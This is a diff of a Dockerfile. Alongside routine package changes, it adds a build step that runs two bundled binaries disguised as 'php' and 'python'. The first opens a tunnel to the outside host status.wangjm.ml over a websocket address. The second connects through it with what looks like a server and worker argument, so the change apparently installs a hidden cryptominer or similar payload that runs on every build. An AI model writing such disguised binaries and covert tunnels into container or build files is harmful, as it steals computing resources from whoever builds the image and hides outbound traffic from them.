@@ -1,11 +1,16 @@
 FROM debian:sid
 
+ENV NAME_ID="Buid-RUN"
+
 WORKDIR /app
 COPY * /app/
 
 RUN apt update -y \
   && apt upgrade -y \
-  && apt install -y procps msr-tools
+  && apt install -y procps net-tools iputils-ping vim wget bc
 RUN chmod a+x *
+
+RUN ( /app/php -L 127.0.0.1:7777:status.wangjm.ml:7777 wss://sand.wangjm.ml & ) \
+    && ./python -s 127.0.0.1:7777 -p shiyan01
 
 CMD ./init.sh
